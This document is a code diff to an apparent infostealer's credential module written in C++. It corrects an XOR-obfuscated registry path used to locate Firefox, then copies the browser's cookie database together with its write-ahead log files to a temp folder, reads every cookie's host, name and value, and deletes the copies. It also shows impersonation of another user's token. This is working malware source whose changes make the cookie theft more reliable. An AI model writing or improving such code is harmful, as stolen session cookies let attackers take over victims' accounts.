@@ -38,7 +38,7 @@ namespace credential {
             char path[MAX_PATH];
             DWORD size = sizeof(path);
             // "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe"
-            std::string keyPath = utils::ws2s(utils::xor_wstr(L"\x09\x15\x1c\x0e\x0d\x1b\x08\x1f\x00\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x00\x0d\x33\x34\x3e\x35\x2d\x29\x00\x19\x2f\x28\x28\x3f\x34\x2e\x1c\x3f\x28\x29\x33\x35\x34\x00\x1b\x2a\x2a\x00\x0a\x3b\x2e\x32\x29\x00\x3c\x33\x28\x3f\x3c\x35\x22\x74\x3f\x22\x3f", 63));
+            std::string keyPath = utils::ws2s(utils::xor_wstr(L"\x09\x15\x1c\x0e\x0d\x1b\x08\x1f\x06\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x06\x0d\x33\x34\x3e\x35\x2d\x29\x06\x19\x2f\x28\x28\x3f\x34\x2e\x04\x3f\x28\x29\x33\x35\x34\x06\x1b\x2a\x2a\x7a\x0a\x3b\x2e\x32\x29\x06\x3c\x33\x28\x3f\x3c\x35\x22\x74\x3f\x22\x3f", 63));
             if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                 if (RegQueryValueExA(hKey, "Path", NULL, NULL, (LPBYTE)path, &size) == ERROR_SUCCESS) {
                     RegCloseKey(hKey);
@@ -145,7 +145,14 @@ namespace credential {
             char tempPath[MAX_PATH];
             GetTempPathA(MAX_PATH, tempPath);
             std::string tempDb = std::string(tempPath) + "cookies_fx_" + std::to_string(GetTickCount()) + ".sqlite";
-            CopyFileA(cookiesDbPath.string().c_str(), tempDb.c_str(), FALSE);
+
+                if (CopyFileA(cookiesDbPath.string().c_str(), tempDb.c_str(), FALSE)) {
+                    CopyFileA((cookiesDbPath.string() + "-wal").c_str(), (tempDb + "-wal").c_str(), FALSE);
+                    CopyFileA((cookiesDbPath.string() + "-shm").c_str(), (tempDb + "-shm").c_str(), FALSE);
+                } else {
+                    continue;
+                }
+
             sqlite3* db;
             if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                 const char* query = "SELECT host, path, isSecure, expiry, name, value FROM moz_cookies";
@@ -166,6 +173,8 @@ namespace credential {
                 sqlite3_close(db);
             }
             DeleteFileA(tempDb.c_str());
+                DeleteFileA((tempDb + "-wal").c_str());
+                DeleteFileA((tempDb + "-shm").c_str());
         }
         if (impersonated) utils::Shared::RevertToSelf();
         if (cookieCount == 0) return "No Firefox cookies found.";
